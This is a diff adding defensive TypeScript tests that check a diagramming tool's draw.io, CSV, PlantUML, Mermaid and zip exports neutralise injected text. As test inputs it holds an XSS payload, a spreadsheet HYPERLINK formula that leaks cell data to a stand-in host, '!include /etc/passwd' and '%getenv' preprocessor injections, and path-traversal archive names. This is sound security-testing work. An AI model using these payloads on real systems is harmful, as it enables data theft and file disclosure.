@@ -213,3 +213,48 @@ describe("PDF", () => {
     entries.forEach((l, i) => expect(text.slice(Number(l.slice(0, 10)), Number(l.slice(0, 10)) + 10)).toMatch(new RegExp(`^${i + 1} 0 obj`)));
   });
 });
+
+describe("exports keep model text inert", () => {
+  const withView = (name: string, el: ReturnType<typeof makeElement>, viewName = "V") => {
+    const ws: Workspace = { ...emptyWorkspace("T"), mappings: DEFAULT_MAPPINGS };
+    ws.elements[el.id] = el;
+    ws.views.v = { id: "v", name: viewName, notation: "c4", viewpoint: "c4:context", nodes: [{ element: el.id, x: 0, y: 0, w: 100, h: 60 }], edges: [], annotations: [], properties: {} } as never;
+    return ws;
+  };
+
+  it("draw.io labels are HTML-escaped inside html=1 cells and fills must be colours", () => {
+    const e = makeElement("c4:Person", '<img src=x onerror=alert(1)>', { description: "<b>d</b>" });
+    const ws = withView("x", e);
+    ws.views.v.nodes[0].style = { fill: "#fff;image=https://example.invalid/x" };
+    const xml = writeDrawio(ws, ["v"]);
+    expect(xml).toContain("&amp;lt;img src=x");
+    expect(xml).not.toContain('"&lt;img');
+    expect(xml).not.toContain("example.invalid");
+  });
+
+  it("CSV cells that a spreadsheet would run as formulas are guarded, and read back unchanged", () => {
+    const ws = withView("x", makeElement("c4:Person", '=HYPERLINK("http://x/?"&A1,"x")', { description: "@SUM(1)", owner: "-1+1" }));
+    const csv = tableToCsv(inventoryTable(ws));
+    expect(csv).not.toMatch(/(^|,)"?[=@+-]/m);
+    expect(csv).toContain(`"'=HYPERLINK(""http://x/?""&A1,""x"")"`);
+    const rows = parseCsv(csv);
+    expect(rows[1]).toContain('=HYPERLINK("http://x/?"&A1,"x")');
+    expect(rows[1]).toContain("@SUM(1)");
+  });
+
+  it("C4-PlantUML and Mermaid never let a name start a new line or call a preprocessor function", () => {
+    const ws = withView("x", makeElement("c4:Person", "a\r!include /etc/passwd"), 'T\n!include /etc/passwd\n%getenv("HOME")');
+    const puml = writeC4Text(ws, "v", "plantuml", c4TypeOf);
+    expect(puml.split("\n").filter((l) => l.startsWith("!include"))).toEqual(["!include <C4/C4_Context>"]);
+    expect(puml).not.toContain("%getenv");
+    expect(puml).not.toContain("\r");
+    const mmd = writeC4Text(ws, "v", "mermaid", c4TypeOf);
+    expect(mmd.split("\n").some((l) => l.trim().startsWith("!include"))).toBe(false);
+  });
+
+  it("archives refuse entry names that leave the extraction folder", () => {
+    for (const bad of ["../x.md", "a/../../x", "/etc/x", "a\\b", "C:x", "a//b", ""]) expect(() => zip({ [bad]: "x" })).toThrow(/unsafe/);
+    expect(() => zip({ "decisions/0001-a.md": "x" })).not.toThrow();
+  });
+});
+
